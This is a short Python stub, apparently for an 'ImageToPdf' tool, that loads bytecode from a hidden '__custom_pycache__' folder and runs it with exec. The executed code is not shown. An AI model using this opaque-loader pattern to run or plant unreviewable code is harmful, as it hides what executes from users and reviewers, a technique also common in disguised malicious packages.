
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToPdf_30a34e932b1d4f8aa0bea8fcd064f68b.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
